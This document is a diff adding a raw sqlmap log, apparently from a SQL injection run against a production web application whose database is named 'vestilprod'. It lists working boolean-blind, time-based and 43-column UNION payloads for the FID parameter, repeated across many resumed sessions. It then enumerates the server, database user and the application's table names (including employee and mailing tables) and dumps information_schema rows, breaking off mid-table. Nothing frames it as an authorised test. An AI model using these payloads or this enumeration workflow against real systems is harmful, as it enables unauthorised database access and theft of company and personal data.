@@ -1,0 +1,920 @@
+sqlmap identified the following injection point(s) with a total of 301 HTTP(s) requests:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+current user: 'vestil-prod@localhost'
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+Database: information_schema
+[61 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: vestilprod
+[43 tables]
++---------------------------------------+
+| Casters                               |
+| Category                              |
+| Cats                                  |
+| Color                                 |
+| ExtBody                               |
+| FAQ                                   |
+| Family                                |
+| Images                                |
+| IndustryCat                           |
+| Jobs                                  |
+| Mailing                               |
+| NonCatalogInventoryAdvice             |
+| ProductData                           |
+| SDS                                   |
+| SDSModels                             |
+| SKU                                   |
+| SND                                   |
+| Tabs                                  |
+| View1                                 |
+| WGI                                   |
+| 360pic                                |
+| Syndigo-Test_bk                       |
+| Syndigo-Test                          |
+| zks-proposal1                         |
+| catalogs                              |
+| certificates                          |
+| drawings                              |
+| industry                              |
+| manuals                               |
+| surveys                               |
+| syndigo                               |
+| vback                                 |
+| vcasters                              |
+| vemployee                             |
+| vestilian                             |
+| vleadtime                             |
+| vleadtime_test                        |
+| vmatrix                               |
+| vnewprod                              |
+| voption                               |
+| voverstock                            |
+| vquickship                            |
+| vspecials                             |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+current user: 'vestil-prod@localhost'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(10)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+Database: information_schema
+[61 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: vestilprod
+[43 tables]
++---------------------------------------+
+| Casters                               |
+| Category                              |
+| Cats                                  |
+| Color                                 |
+| ExtBody                               |
+| FAQ                                   |
+| Family                                |
+| Images                                |
+| IndustryCat                           |
+| Jobs                                  |
+| Mailing                               |
+| NonCatalogInventoryAdvice             |
+| ProductData                           |
+| SDS                                   |
+| SDSModels                             |
+| SKU                                   |
+| SND                                   |
+| Tabs                                  |
+| View1                                 |
+| WGI                                   |
+| 360pic                                |
+| Syndigo-Test_bk                       |
+| Syndigo-Test                          |
+| zks-proposal1                         |
+| catalogs                              |
+| certificates                          |
+| drawings                              |
+| industry                              |
+| manuals                               |
+| surveys                               |
+| syndigo                               |
+| vback                                 |
+| vcasters                              |
+| vemployee                             |
+| vestilian                             |
+| vleadtime                             |
+| vleadtime_test                        |
+| vmatrix                               |
+| vnewprod                              |
+| voption                               |
+| voverstock                            |
+| vquickship                            |
+| vspecials                             |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: FID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: FID=1430 AND 8777=8777
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: FID=1430 AND (SELECT 7210 FROM (SELECT(SLEEP(5)))aTdY)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 43 columns
+    Payload: FID=-2389 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171707671,0x7275716857425950476b5a6d4a7879564e4f6a554343634a73724547774a725a6b797446764d6f45,0x7176767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] vestilprod
+
+Database: information_schema
+Table: VIEWS
+[1 entry]
++-----------+--------------+--------------+--------------+--------------+---------------+---------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+----------------------+
+| DEFINER   | CHECK_OPTION | IS_UPDATABLE | TABLE_SCHEMA | TABLE_NAME   | SECURITY_TYPE | TABLE_CATALOG | VIEW_DEFINITION                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | CHARACTER_SET_CLIENT | COLLATION_CONNECTION |
++-----------+--------------+--------------+--------------+--------------+---------------+---------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+----------------------+
+| root@%    | NONE         | YES          | vestilprod   | View1        | DEFINER       | def           | select `vestilprod`.`NonCatalogInventoryAdvice`.`VestilPN` AS `VestilPN`,`vestilprod`.`NonCatalogInventoryAdvice`.`Available` AS `Available`,`vestilprod`.`NonCatalogInventoryAdvice`.`LeadTime` AS `LeadTime`,`vestilprod`.`Syndigo-Test`.`PackageWeight` AS `PackageWeight`,`vestilprod`.`NonCatalogInventoryAdvice`.`ListPrice` AS `ListPrice` from (`vestilprod`.`NonCatalogInventoryAdvice` join `vestilprod`.`Syndigo-Test` on((convert(`vestilprod`.`NonCatalogInventoryAdvice`.`VestilPN` using utf8) = `vestilprod`.`Syndigo-Test`.`Model`))) | utf8                 | utf8_general_ci      |
++-----------+--------------+--------------+--------------+--------------+---------------+---------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+----------------------+
+
+Database: information_schema
+Table: PARTITIONS
+[103 entries]
++-----------+---------------------+------------+------------+---------------------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+---------------------+-----------------+-----------------+------------------+------------------+--------------------+-------------------+---------------------+----------------------+-----------------------+-------------------------+---------------------------------------+-------------------------------+
+| DATA_FREE | CHECK_TIME          | TABLE_ROWS | CHECKSUM   | CREATE_TIME         | DATA_LENGTH | UPDATE_TIME | NODEGROUP   | INDEX_LENGTH | TABLE_SCHEMA | TABLE_NAME   | TABLE_CATALOG | PARTITION_NAME      | MAX_DATA_LENGTH | TABLESPACE_NAME | PARTITION_METHOD | AVG_ROW_LENGTH   | PARTITION_COMMENT  | SUBPARTITION_NAME | SUBPARTITION_METHOD | PARTITION_EXPRESSION | PARTITION_DESCRIPTION | SUBPARTITION_EXPRESSION | PARTITION_ORDINAL_POSITION            | SUBPARTITION_ORDINAL_POSITION |
++-----------+---------------------+------------+------------+---------------------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+---------------------+-----------------+-----------------+------------------+------------------+--------------------+-------------------+---------------------+----------------------+-----------------------+-------------------------+---------------------------------------+-------------------------------+
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16434816     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 384              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | CHARACTER_SETS                        | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16704765     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 231              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | COLLATIONS                            | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16357770     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 195              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | COLLATION_CHARACTER_SET_APPLICABILITY | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | COLUMNS          | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16757145     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2565             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | COLUMN_PRIVILEGES                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16574250     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 490              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | ENGINES                               | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | EVENTS           | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16768412     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 14468            | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | FILES                                 | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16755036     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 3268             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | GLOBAL_STATUS                         | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16755036     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 3268             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | GLOBAL_VARIABLES                      | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16762755     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 4637             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | KEY_COLUMN_USAGE                      | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | OPTIMIZER_TRACE  | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | PARAMETERS       | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | PARTITIONS       | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | PLUGINS          | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | PROCESSLIST      | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16562084     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 308              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | PROFILING                             | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16767162     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 4814             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | REFERENTIAL_CONSTRAINTS               | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | ROUTINES         | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16738048     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 3464             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | SCHEMATA                              | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16736899     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2179             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | SCHEMA_PRIVILEGES                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16755036     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 3268             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | SESSION_STATUS                        | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16755036     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 3268             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | SESSION_VARIABLES                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16752736     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 5753             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | STATISTICS                            | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16757775     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 9441             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | TABLES                                | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16772763     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 6951             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | TABLESPACES                           | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16721712     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2504             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | TABLE_CONSTRAINTS                     | <blank>                       |
